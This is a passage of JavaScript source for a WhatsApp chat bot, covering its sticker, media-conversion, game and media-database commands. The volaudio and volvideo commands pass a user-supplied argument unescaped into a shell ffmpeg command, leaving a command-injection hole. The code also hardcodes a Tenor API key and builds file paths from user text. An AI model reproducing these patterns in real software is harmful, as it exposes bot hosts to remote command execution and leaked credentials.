                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
                                sourceUrl: king,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcalya(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await AlyaBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcalya('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await AlyaBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcalya(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcalya(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
AlyaBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
AlyaBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await AlyaBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcalya('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await AlyaBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcalya(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcalya(`Reply sticker with caption *${prefix + command}*`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    AlyaBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcalya(`Reply sticker with caption *${prefix + command}*`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await AlyaBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcalya(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                AlyaBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcalya(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                AlyaBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `starking.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcalya(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                AlyaBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcalya(`Reply sticker with caption *${prefix + command}*`)
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await AlyaBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcalya(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcalya(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcalya(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcalya(`Example : ${prefix + command} 😅+🤔`)
                await AlyaStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await AlyaBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygcalya(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await AlyaBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcalya(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                    AlyaBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                    AlyaBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                   AlyaBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcalya(`Example:\n${prefix}fliptext starking`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcalya(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return replygcalya(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await AlyaBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return replygcalya(`Example: ${prefix + command} 10`)
media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcalya('Error!')
jadie = fs.readFileSync(rname)
AlyaBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcalya(`Example: ${prefix + command} 10`)
media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcalya('Error!')
jadie = fs.readFileSync(rname)
AlyaBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await AlyaStickWait()
                let media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcalya(err)
                let buff = fs.readFileSync(ran)
                AlyaBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcalya(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcalya(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcalya(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcalya('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    replygcalya('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await AlyaBotInc.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await AlyaBotInc.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    replygcalya('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        AlyaBotInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        replygcalya(`Session TicTacToe🎮 tidak ada`)
                    } else replygcalya('?')
                } catch (e) {
                    replygcalya('Error')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcalya(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return replygcalya(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return replygcalya(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcalya(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
                this.suit[id] = {
                    chat: await AlyaBotInc.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) AlyaBotInc.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcalya(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcalya(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                AlyaBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcalya("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                replygcalya(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'openai-indo': {
	            if (!q) return replygcalya(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await replygcalya(isi)
			   }
			   break
    case 'ephemeral': {
                if (!m.isGroup) return AlyaStickGroup()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (!isAdmins) return AlyaStickAdmin()
                if (args[0] === 'on') {
                    await AlyaBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcalya(`Done`)
                } else if (args[0] === 'off') {
                    await AlyaBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcalya(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 AlyaBotInc.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!AlyaTheQueen) return AlyaStickOwner()
               
               if (args[0] === 'on') {
                  antiswview = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!AlyaTheQueen) return AlyaStickOwner()
               
               if (args[0] === 'on') {
                  anticall = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
             break
case 'addvideo':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Whats the video name?')
if (VideoAlya.includes(q)) return replygcalya("The name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
VideoAlya.push(q)
await fsx.copy(delb, `./AlyaMedia/video/${q}.mp4`)
fs.writeFileSync('./AlyaMedia/database/alyavideo.json', JSON.stringify(VideoAlya))
fs.unlinkSync(delb)
replygcalya(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Enter the video name')
if (!VideoAlya.includes(q)) return replygcalya("The name does not exist in the database")
let wanu = VideoAlya.indexOf(q)
VideoAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/alyavideo.json', JSON.stringify(VideoAlya))
fs.unlinkSync(`./AlyaMedia/video/${q}.mp4`)
replygcalya(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoAlya) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoAlya.length}*`
replygcalya(teks)
}
break
case 'addimage':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Whats the image name?')
if (ImageAlya.includes(q)) return replygcalya("The name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
ImageAlya.push(q)
await fsx.copy(delb, `./AlyaMedia/image/${q}.jpg`)
fs.writeFileSync('./AlyaMedia/database/alyaimage.json', JSON.stringify(ImageAlya))
fs.unlinkSync(delb)
replygcalya(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Enter the image name')
if (!ImageAlya.includes(q)) return replygcalya("The name does not exist in the database")
let wanu = ImageAlya.indexOf(q)
ImageAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/alyaimage.json', JSON.stringify(ImageAlya))
fs.unlinkSync(`./AlyaMedia/image/${q}.jpg`)
replygcalya(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageAlya) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageAlya.length}*`
replygcalya(teks)
}
break
case 'addsticker':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Whats the sticker name?')
if (StickerAlya.includes(q)) return replygcalya("The name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
StickerAlya.push(q)
await fsx.copy(delb, `./AlyaMedia/sticker/${q}.webp`)
fs.writeFileSync('./AlyaMedia/database/alyaSticker.json', JSON.stringify(StickerAlya))
fs.unlinkSync(delb)
replygcalya(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Enter the sticker name')
if (!StickerAlya.includes(q)) return replygcalya("The name does not exist in the database")
let wanu = StickerAlya.indexOf(q)
StickerAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/alyaSticker.json', JSON.stringify(StickerAlya))
fs.unlinkSync(`./AlyaMedia/sticker/${q}.webp`)
replygcalya(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerAlya) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerAlya.length}*`
replygcalya(teks)
}
break
case 'addmsg': {
	if (!AlyaTheQueen) return AlyaStickOwner()
                if (!m.quoted) return replygcalya('Reply Message You Want To Save In Database')
                if (!text) return replygcalya(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygcalya(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcalya(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcalya(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygcalya(`'${text}' not listed in the message list`)
                AlyaBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcalya(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!AlyaTheQueen) return AlyaStickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygcalya(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcalya(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Whats the audio name?')
if (VoiceNoteAlya.includes(q)) return replygcalya("The name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteAlya.push(q)
await fsx.copy(delb, `./AlyaMedia/audio/${q}.mp3`)
fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteAlya))
fs.unlinkSync(delb)
replygcalya(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!AlyaTheQueen) return AlyaStickOwner()
if (args.length < 1) return replygcalya('Enter the vn name')
if (!VoiceNoteAlya.includes(q)) return replygcalya("The name does not exist in the database")
let wanu = VoiceNoteAlya.indexOf(q)
VoiceNoteAlya.splice(wanu, 1)
fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteAlya))
fs.unlinkSync(`./AlyaMedia/audio/${q}.mp3`)
replygcalya(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteAlya) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteAlya.length}*`
replygcalya(teks)
}
break
case 'addzip':{
if (!AlyaTheQueen) return AlyaStickOwner()

if (args.length < 1) return replygcalya(`What's the zip name?`)
let teks = `${text}`
{
if (ZipAlya.includes(teks)) return replygcalya("This name is already in use")
let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
ZipAlya.push(teks)
await fsx.copy(delb, `./AlyaMedia/zip/${teks}.zip`)
fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipAlya))
fs.unlinkSync(delb)
